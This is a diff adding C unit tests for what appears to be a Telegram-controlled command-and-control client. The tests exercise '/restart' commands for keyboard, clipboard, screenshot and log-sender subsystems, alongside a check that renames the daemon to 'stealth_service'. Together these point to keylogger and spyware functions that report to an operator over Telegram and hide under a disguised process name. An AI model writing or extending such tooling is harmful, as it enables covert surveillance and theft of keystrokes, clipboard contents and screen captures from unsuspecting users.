@@ -888,6 +888,88 @@ int main(void) {
     if (strcmp(c2t_config_get()->daemon_name, "stealth_service") != 0 ||
         !body_contains("stealth_service", 15))
       return fail("/rename alias command failed");
+
+    /* Subsystem restart / reset tests */
+    telegram_incoming_update_t update_rst_kb = {
+        .update_id = 1004,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/restart keyboard",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_kb);
+    if (!body_contains("Keyboard%20Subsystem%20Restarted", sizeof("Keyboard%20Subsystem%20Restarted") - 1))
+      return fail("/restart keyboard command failed");
+
+    telegram_incoming_update_t update_rst_clip = {
+        .update_id = 1005,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/restart clipboard",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_clip);
+    if (!body_contains("Clipboard%20Subsystem%20Restarted", sizeof("Clipboard%20Subsystem%20Restarted") - 1))
+      return fail("/restart clipboard command failed");
+
+    telegram_incoming_update_t update_rst_shot = {
+        .update_id = 1006,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/restart screenshot",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_shot);
+    if (!body_contains("Screenshot%20Subsystem%20Restarted", sizeof("Screenshot%20Subsystem%20Restarted") - 1))
+      return fail("/restart screenshot command failed");
+
+    telegram_incoming_update_t update_rst_logs = {
+        .update_id = 1007,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/restart logs",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_logs);
+    if (!body_contains("Log%20Sender%20Subsystem%20Restarted", sizeof("Log%20Sender%20Subsystem%20Restarted") - 1))
+      return fail("/restart logs command failed");
+
+    telegram_incoming_update_t update_rst_all = {
+        .update_id = 1008,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/restart all",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_all);
+    if (!body_contains("All%20Subsystems%20Reset%20%26amp%3B%20Restarted", sizeof("All%20Subsystems%20Reset%20%26amp%3B%20Restarted") - 1))
+      return fail("/restart all command failed");
+
+    telegram_incoming_update_t update_rst_kb_alias = {
+        .update_id = 1009,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/reset_kb",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_kb_alias);
+    if (!body_contains("Keyboard%20Subsystem%20Restarted", sizeof("Keyboard%20Subsystem%20Restarted") - 1))
+      return fail("/reset_kb alias command failed");
+
+    telegram_incoming_update_t update_rst_invalid = {
+        .update_id = 1010,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/restart invalid_target_xyz",
+    };
+    c2t_telegram_listener_handle_update(&update_rst_invalid);
+    if (!body_contains("Supported%20targets", sizeof("Supported%20targets") - 1))
+      return fail("/restart invalid target usage help failed");
+
+    /* Verify /help contains /restart */
+    telegram_incoming_update_t update_help = {
+        .update_id = 1011,
+        .date = 0,
+        .chat_id = target_chat,
+        .text = "/help",
+    };
+    c2t_telegram_listener_handle_update(&update_help);
+    if (!body_contains("restart", 7))
+      return fail("/help missing restart documentation");
   }
 
   unsetenv("C2T_DAEMON_NAME");
